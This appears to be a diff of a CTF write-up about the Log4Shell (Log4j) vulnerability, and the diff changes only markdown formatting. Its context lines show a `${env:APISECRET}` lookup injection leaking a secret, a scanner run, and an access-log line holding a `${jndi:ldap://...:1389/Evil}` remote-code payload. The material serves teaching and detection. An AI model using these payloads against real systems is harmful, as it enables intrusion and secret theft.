@@ -3,13 +3,13 @@
 The objective is to demonstrate, patch and provide advice on the recent Log4Jack vulnerability.
 
 ### 14.0. Hints
-**Log4j Talk** - *Bow Ninecandle*: “Prof. Qwerty Petabyte is giving [a lesson](https://youtu.be/OuYMPU3-0p4) about Apache Log4j.”
-**Log4j Search Script** - *Bow Ninecandle*: “Josh Wright's [simple checker script](https://gist.github.com/joswr1ght/a6badf9b0b148efadfccbf967fcc2b41) uses the power of regex to find vulnerable Log4j libraries!”
-**Log4j Remediation** - *Bow Ninecandle*: “[Clearing Log4j issues](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) from systems.”
-**Log4J at Apache** - *Bow Ninecandle*: “Software by the [Apache Foundation](https://logging.apache.org/log4j/2.x/manual/lookups.html) runs on devices all over the internet”
+**Log4j Talk** - *Bow Ninecandle*: “Prof. Qwerty Petabyte is giving [a lesson](https://youtu.be/OuYMPU3-0p4) about Apache Log4j.”  
+**Log4j Search Script** - *Bow Ninecandle*: “Josh Wright's [simple checker script](https://gist.github.com/joswr1ght/a6badf9b0b148efadfccbf967fcc2b41) uses the power of regex to find vulnerable Log4j libraries!”  
+**Log4j Remediation** - *Bow Ninecandle*: “[Clearing Log4j issues](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) from systems.”  
+**Log4J at Apache** - *Bow Ninecandle*: “Software by the [Apache Foundation](https://logging.apache.org/log4j/2.x/manual/lookups.html) runs on devices all over the internet”  
 
 #### 14.1. Solution
-The shell walks through the compilation and exploiting of the vulnerable “DisplayFilev2” java program:
+The shell walks through the compilation and exploiting of the vulnerable `DisplayFilev2` java program:
 ```java
 import java.io.*;
 import org.apache.logging.log4j.Logger;
@@ -41,7 +41,7 @@ elfu@33580ab650ea:~/vulnerable$ java DisplayFilev2 '${env:APISECRET}'
 12:27:44.523 [main] ERROR DisplayFilev2 - Unable to read file pOFZFiWHjqKoQaRhNYyC (make sure you specify a valid file name).
 ```
 
-The shell then uses log4j-scan to identify vulnerable java applications:
+The shell then uses `log4j-scan` to identify vulnerable java applications:
 ```bash
 elfu@33580ab650ea:~/vulnerable$ log4j2-scan /var/www/solr/
 Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
@@ -56,7 +56,7 @@ Found 0 mitigated files
 Completed in 0.34 seconds
 ```
 
-Also it uses the script logshell-search to observe IOCs in `/var/log/www` logs:
+Also it uses the script `logshell-search` to observe IOCs in `/var/log/www` logs:
 ```bash
 elfu@33580ab650ea:~/vulnerable$ logshell-search.sh /var/log/www/
 /var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
